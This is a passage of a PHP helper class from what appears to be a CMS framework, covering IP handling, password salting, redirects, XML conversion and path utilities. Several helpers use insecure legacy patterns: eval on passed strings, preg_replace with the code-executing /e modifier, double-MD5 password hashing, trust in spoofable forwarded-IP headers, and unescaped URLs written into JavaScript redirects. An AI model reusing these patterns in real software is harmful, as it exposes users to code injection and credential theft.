		if($ip==0){
			$ip = '';
			isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '127.0.0.1';
			isset($_SERVER['HTTP_X_FORWARDED_FOR']) && $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
			isset($_SERVER['HTTP_ALI_CDN_REAL_IP']) && $ip = $_SERVER['HTTP_ALI_CDN_REAL_IP'];
			return $ip ? $ip : (isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '127.0.0.1');
		} else {
			$ip=(float)$ip;
			$ip1=$ip>>24&0xFF;
			$ip2=$ip>>16&0xFF;
			$ip3=$ip>>8&0xFF;
			$ip4=$ip&0xFF;
			if(!$xinghao)return "$ip1.$ip2.$ip3.$ip4";
			else {
				if($xinghao==1)return "$ip1.$ip2.$ip3.*";
				if($xinghao==2)return "$ip1.$ip2.*.*";
				if($xinghao==3)return "$ip1.*.*.*";
				if($xinghao==4)return "*.*.*.*";
			}
		}
	}
	public static function isIp($str){
		return preg_match('/^\d{1,3}(\.\d{1,3}){3}$/', $str) > 0 ? true : false;
	}
	public static function salt(){
		return substr(uniqid(rand()), -6);
	}
	public static function saltPwd($salt, $pwd){
		return md5(md5($pwd).$salt);
	}
	public static function saltPwdCheck($salt, $nowPwd, $m5Pwd){
		return self::saltPwd($salt, $nowPwd) == $m5Pwd;
	}
	public static function gotoUrl($url, $fullUrl = false, $alert = '', $html = ''){
		qscms::ob_clean();
		$gotoUrl = !$fullUrl?WEB_URL.(!self::defineTrue('WEB_REWRITE')?'/rewrite.php?rewrite='.str_replace('?', '&', $url):$url):$url;
		$var = qscms::v('_G');
		if ($var->menuAjax) {
			echo 'goto:'.$gotoUrl;
		} else {
		echo '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>页面跳转</title>
</head>

<body>'.(!empty($html) ? $html : '').'
<script language="javascript">
	'.($alert?'alert(\''.self::addcslashes($alert).'\');':'').'
	location.href="'.$gotoUrl.'"
</script>
</body>
</html>
';
	}
		exit;
	}
	public static function getUrl($url){
		return WEB_URL.(!self::defineTrue('WEB_REWRITE')?'/rewrite.php?rewrite='.str_replace('?', '&', $url) : $url);
	}
	public static function back($msg = ''){
		//header('Location:'.(!$full_url?$GLOBALS['weburl']:'').$url);
		qscms::ob_clean();
		echo '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>页面跳转</title>
</head>

<body>
<script language="javascript">
'.($msg ? 'alert(\''.self::addcslashes($msg).'\')' : '').'
	history.back(-1);
</script>
</body>
</html>
';
		exit;
	}
	public static function refresh($alert = ''){
		self::gotoUrl(NOW_URL, true, $alert);
	}
	public static function checkrobot($useragent = '') {
		static $kw_spiders = 'Bot|Crawl|Spider|slurp|sohu-search|lycos|robozilla';
		static $kw_browsers = 'MSIE|Netscape|Opera|Konqueror|Mozilla';
		$useragent = empty($useragent) ? (!empty($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '') : $useragent;
		if(strpos($useragent, 'http://') === false && preg_match("/($kw_browsers)/i", $useragent)) {
			return false;
		} elseif(preg_match("/($kw_spiders)/i", $useragent)) {
			return true;
		} else {
			return false;
		}
	}
	public static function intval($val, $emptyVal = 0){
		if (empty($val)) return $emptyVal;
		return intval($val);
	}
	public static function emptyVal($val, $eVal = ''){
		if (empty($val)) return $eVal;
		return $val;
	}
	public static function getEval($data){
		$tmp = self::ob_get_contents();
		self::ob_clean();
		@eval($data);
		$eval = self::ob_get_contents();
		self::ob_clean();
		echo $tmp;
		return $eval;
	}
	public static function trimExplode($flag, $str){
		$rn = array();
		$sp = explode($flag, $str);
		foreach($sp as $v){
			$rn[] = trim($v);
		}
		return $rn;
	}
	public static function trimSplit($flag, $str){
		$rn = array();
		$sp = preg_split($flag, $str);
		foreach($sp as $v){
			$rn[] = trim($v);
		}
		return $rn;
	}
	public static function filterHtml($arr){
		if(is_array($arr)){
			foreach($arr as $k=>$v){
				$arr[$k] = self::filterHtml($v);
			}
		} else $arr = is_int($arr) ? $arr : preg_replace('/<.*?>/s', '', $arr);
		return $arr;
	}
	public static function filterArray($arr, $keys, $isFill = false, $fillData = ''){
		$rn = array();
		foreach($keys as $key){
			if(isset($arr[$key]))$rn[$key] = $arr[$key];
			elseif ($isFill) $rn[$key] = $fillData;
		}
		return $rn;
	}
	public static function cutstr($data,$len){
		$data    = preg_replace("/<.*?>/", "", $data);
		$dataLen = mb_strlen($data);
		if ($dataLen > $len) {
			$data = mb_substr($data, 0, $len - 1).'…';
		}
		return $data;
	}
	public static function cutstr2($data,$len){
		$data    = preg_replace("/\[.*?\]/", "", $data);
		$dataLen = mb_strlen($data);
		if ($dataLen > $len) {
			$data = mb_substr($data, 0, $len - 1).'…';
		}
		return $data;
	}
	public static function cutHtml($data, $len){
		$data2 = preg_replace('/<.*?>/', '', $data);
		$dataLen  = mb_strlen($data);
		$dataLen2 = mb_strlen($data2);
		if ($dataLen2 > $len) {
			
		} else {
			return $data;
		}
	}
	public static function format_trim_text($str){
		$str=preg_replace('/<.+?>/s','',$str);
		return trim($str);
	}
	private static function replaceVars_($key, $arr){
		if (empty($arr[$key])) return '{'.$key.'}';
		return $arr[$key];
	}
	public static function replaceVars($str, $arr){
		if (PHP55) {
			return preg_replace_callback('/\{(\w+?)\}/', function($ms) use($arr) {
				return self::replaceVars_($ms[1], $arr);
			}, $str);
		} else return preg_replace('/\{(\w+?)\}/e','self::replaceVars_(\'$1\', $arr)', $str);
	}
	public static function formatMoney($money){
		if (substr($money, -1) == '%') return self::formatMoney(self::percentDecimal($money));
		$money = (float)$money;
		$money = floor($money * 100 + 0.5) / 100;
		return $money;
	}
	public static function setType(&$var, $type){
		if (is_array($var)) {
			foreach($var as &$v) {
				self::setType($v, $type);
			}
		} else {
			switch ($type) {
				case '01':
					$var = $var ? 1 : 0;
				break;
				case 'money':
					$var = self::formatMoney($var);
				break;
				default:
					substr($var, -1) == '%' && $var = self::percentDecimal($var);
					if (strpos($type, ',') !== false) {
						$sp = self::trimExplode(',', $type);
						!in_array($var, $sp) && $var = $sp[0];
					} else {
						settype($var, $type);
					}
				break;
			}
		}
	}
	public static function percentDecimal($percent){
		if (preg_match('/^(\d+(?:\.\d+)?)%$/', $percent, $matches)) {
			return doubleval($matches[1]) / 100;
		}
		return 0;
	}
	public static function decimalPercent($decimal){
		return sprintf("%01.2f", $decimal * 100).'%';
	}
	public static function setMsg($message, $key = '_showmessage'){
		self::setcookie($key, $message);
	}
	public static function imgUrl($type, $did){
		if ($did > 3) return memory::get('disperse_url_'.$did).'/';
		else return qscms::getImgUrl($type);	
	}
	public static function videoUrl($type, $did){
		if ($did > 3) return memory::get('disperse_url_').$did.'/';
		else return qscms::getVideoUrl($type);	
	}
	public static function dUrl ($did){
		return memory::get('disperse_url_').$did.'/';
	}
	public static function getVideoDir($type, $path = ''){
		static $dirs = array();
		$path && $path = strtr($path, '/', D);
		if (isset($dirs[$type])) return $dirs[$type].$path;
		$dirs[$type] = d(self::getCfgPath('/system/videoRoot').cfg::get('web', 'dir_'.$type));
		return $dirs[$type].$path;
	}
	
	public static function getVideoUrl($type, $path = ''){
		static $dirs = array();
		$path && $path = strtr($path, D, '/');
		if (isset($dirs[$type])) return $dirs[$type].$path;
		$dirs[$type] = u(self::getCfgPath('/system/videoRoot').cfg::get('web', 'dir_'.$type));
		return $dirs[$type].$path;
	}
	public static function getImgDir($type = '', $path = ''){
		static $dirs = array();
		$path && $path = strtr($path, '/', D);
		if (isset($dirs[$type])) return $dirs[$type].$path;
		$urls = $type ? cfg::get('web', 'dir_'.$type) : '';
		$dirs[$type] = d(self::getCfgPath('/system/imgRoot').$urls);
		return $dirs[$type].$path;
	}
	public static function getImgUrl($type = '', $path = ''){
		static $dirs = array();
		$path && $path = strtr($path, D, '/');
		if (isset($dirs[$type])) return $dirs[$type].$path;
		$urls = $type ? cfg::get('web', 'dir_'.$type) : '';
		$dirs[$type] = WEB_URL.u(self::getCfgPath('/system/imgRoot').$urls);
		return $dirs[$type].$path;
	}
	public static function getFileDir($type, $path = ''){
		static $dirs = array();
		$path && $path = strtr($path, '/', D);
		if (isset($dirs[$type])) return $dirs[$type].$path;
		$dirs[$type] = d(self::getCfgPath('/system/fileRoot').cfg::get('web', 'dir_'.$type));
		return $dirs[$type].$path;
	}
	public static function getFileUrl($type, $path = ''){
		static $dirs = array();
		$path && $path = strtr($path, D, '/');
		if (isset($dirs[$type])) return $dirs[$type].$path;
		$dirs[$type] = u(self::getCfgPath('/system/fileRoot').cfg::get('web', 'dir_'.$type));
		return $dirs[$type].$path;
	}
	public static function getArticleIds($id){
		$id = sprintf('%08X' ,$id);
		$a  = substr($id,0,2);
		$b  = substr($id,2,2);
		$c  = substr($id,4,2);
		$d  = substr($id,6,2);
		return array($a,$b,$c,$d);
	}
	public static function getArticlePath($id, $f = D){
		$sp = self::getArticleIds($id);
		return implode($f, $sp);
	}
	public static function xmlToArray ($strXml) {
		$pos = strpos($strXml, 'xml');
		if ($pos) {
			$xmlCode   = simplexml_load_string($strXml,'SimpleXMLElement', LIBXML_NOCDATA);
			$arrayCode = self::get_object_vars_final($xmlCode);
			return $arrayCode ;
		} else {
			return '';
		}
	}
	public static function get_object_vars_final($obj){
		if(is_object($obj)){
			$obj = get_object_vars($obj);
			is_array($obj) && empty($obj) && $obj = '';
		}
		if(is_array($obj)){
			foreach ($obj as $key=>$value){
				$obj[$key] = self::get_object_vars_final($value);
			}
		}
		return $obj;
	}
	public static function toSimpleXml($arr){
		$str = '<?xml version="1.0" encoding="'.ENCODING.'"?><result> ';
		$str .= self::getXml($arr);
		$str.='</result>';
		return $str;
	}
	public static function getXml($arr, $setKey = false){
		switch(gettype($arr)){
			case 'boolean':
				return $arr?"true":"false";
			break;
			case 'integer':
				return $arr;
			break;
			case 'double':
				return $arr;
			break;
			case 'string':
				return '<![CDATA['.$arr.']]>';
			break;
			case 'array':
				$str = '';
				foreach ($arr as $k=>$v) {
					if (is_array($v)) {
						$keys = array_keys($v);
						$isNum = true;
						$count = count($keys);
						for ($i = 0; $i < $count; $i++) {
							if (!is_int($keys[$i]) || $keys[$i] != $i) {
								$isNum = false;
								break;
							}
						}
						if ($isNum) {
							foreach ($v as $v2) {//echo $k;print_r($v2);
								$str .= '<'.$k.'>'.self::getXml($v2).'</'.$k.'>';
							}
						} else {
							$str .= ' <'.$k.'>'.self::getXml($v).'</'.$k.'>';
						}
					} else {
						$str .= ' <'.$k.'>'.self::getXml($v).'</'.$k.'>';
					}
				}
				return $str;
			break;
			case 'object':
				return '';
			break;
			case 'resource':
				return '';
			break;
			case 'NULL':
				return '';
			break;
			case 'user function':
				return '';
			break;
			case 'unknown type':
				return '';
			break;
		}
	}
	public static function arrayUnsetEmpty(&$arr){
		if (is_array($arr)) {
			$tmpArr = array();
			foreach ($arr as $k => $v) {
				if (is_array($v)) {
					self::arrayUnsetEmpty($v);
					if (count($v) > 0) $tmpArr[$k] = $v;
				} else {
					if ($v !== '') $tmpArr[$k] = $v;
				}
			}
			$arr = $tmpArr;
		}
	}
	public static function trim($arr, $char = ' '){
		$rs = array();
		if (is_array($arr)) {
			foreach ($arr as $k => $v) {
				if (is_array($v)) $rs[$k] = self::trim($v, $char);
				else $rs[$k] = trim($v, $char);
			}
		} else $rs = trim($arr, $char);
		return $rs;
	}
	public static function showMessage($msg, $url = '', $time = 3, $tpl = ''){
		$in = 'message';
		$var = self::v('_G');
		$tplRoot = qd(self::getCfgPath('/system/tplRoot').cfg::get('sys', 'tplFolder'));
		$cacheRoot = d(self::getCfgPath('/system/cacheDirRoot+/system/cacheDirs/tpl').cfg::get('sys', 'tplFolder'));
		template::initialize($tplRoot, $cacheRoot);
		self::ob_clean();
		$var = self::v('_G');
		$member = $var->member;
		$webName = $var->webName;
		if ($tpl && template::exists($tpl)) {
			if (($f = strrpos($tpl, '/')) !== false) {
				$path = substr($tpl, 0, $f);
				$tpl = substr($tpl, $f + 1);
				template::addPath($path, $path);
			}
			include(template::load($tpl));
		} else {
			include(template::load('message'));
		}
		exit;
	}
	public static function getTplHTML($tpl){
		$var = self::v('_G');
		$shtml = self::ob_get_contents();
		self::ob_clean();
		include(template::load($tpl));
		$dhtml = self::ob_get_contents();
		self::ob_clean();
		echo $shtml;
		return $dhtml;
	}
	public static function arrayMap($datas, $args, $fill = true, $fillData = ''){
		$rs = array();
		foreach ($args as $k => $v) {
			if (is_int($k)) $k = $v;
			if (isset($datas[$v])) $rs[$k] = $datas[$v];
			else {
				if ($fill) $rs[$k] = $fillData;
			}
		}
		return $rs;
	}
	public static function domainLen($domain){
		if ($str = string::getPregVal('/([a-z0-9-\.]+?)\.(?:com|mobi|gov\.cn|so|net|org|name|me|co|com\.cn|net\.cn|org\.cn|tel|info|biz|cc|tv|hk|asia|cn|eu|ws|la|公司|网络|中国)$/i', $domain)) {
			return strlen($str);
		}
		return false;
	}
	public static function domainSuffix($domain){
		if ($str = string::getPregVal('/[a-z0-9-\.]+?(\.(?:com|mobi|gov\.cn|so|net|org|name|me|co|com\.cn|net\.cn|org\.cn|tel|info|biz|cc|tv|hk|asia|cn|eu|ws|la|公司|网络|中国))$/i', $domain)) {
			return $str;
		}
		return false;
	}
}
?>